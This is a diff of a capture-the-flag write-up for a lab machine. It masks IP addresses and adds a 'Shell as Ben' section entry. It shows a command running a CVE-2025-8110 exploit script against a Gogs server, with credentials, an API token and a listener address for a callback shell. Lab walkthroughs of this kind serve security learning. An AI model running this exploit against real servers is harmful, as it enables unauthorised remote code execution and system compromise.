@@ -31,6 +31,7 @@
 - [Docker Enumeration](#docker-enumeration)
 	- [ash_history](#ash_history)
 	- [Environment variables](#environment-variables)
+	- [Shell as Ben](#shell-as-ben)
 - [Privilege Escalation](#privilege-escalation)
 	- [MailHog](#mailhog)
 	- [Gogs](#gogs)
@@ -380,7 +381,7 @@ ENABLE_FEDERATED_AVATAR = false
 We notice it's running on port 3001 and that the subdomain used is `staging-v2-code.dev.silentium.htb`. Let's add it to our `/etc/hosts` file and try to access it
 
 ```
-echo '10.129.17.151 staging-v2-code.dev.silentium.htb' | tee -a /etc/hosts
+echo '10.129.*.* staging-v2-code.dev.silentium.htb' | tee -a /etc/hosts
 ```
 
 ### CVE-2025-8110
@@ -405,7 +406,7 @@ Now we need to generate a New Token under "_Your settings --> Applications --> G
 We can use [this](CVE-2025-8110.py.md) script to exploit the target with all the information that we got.
 
 ```
-python3 CVE-2025-8110.py -u http://staging-v2-code.dev.silentium.htb -U makis -p makis -t dd920f6f35c5150432ec66ba6ff9f5c759e86c4b -lh 10.10.14.* -lp 443
+python3 CVE-2025-8110.py -u http://staging-v2-code.dev.silentium.htb -U makis -p makis -t dd920f6f35c5150432ec66ba6ff9f5c759e86c4b -lh 10.10.*.* -lp 443
 [+] Connected
 [+] Repo creation status: 201
 [+] Repo created : 449d0c6afc40
